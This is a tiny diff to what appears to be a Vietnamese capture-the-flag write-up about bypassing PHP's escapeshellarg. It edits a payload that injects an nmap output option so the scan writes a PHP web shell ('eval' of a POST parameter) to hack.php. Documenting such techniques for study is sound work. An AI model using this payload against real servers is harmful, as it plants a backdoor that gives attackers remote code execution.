@@ -38,5 +38,5 @@ Mình có đọc [wu](https://security.szurek.pl/en/exploit-bypass-php-escapeshe
 
 Payload: `nmap -T5 -sT -Pn --host-timeout 2 -F '1'\\shellcode\'`
 
-shellcode: `' <?= @eval($_POST["hack"]);?> -og hack.php `
+shellcode: `' <?= @eval($_POST["hack"]);?> -og hack.php '`
 
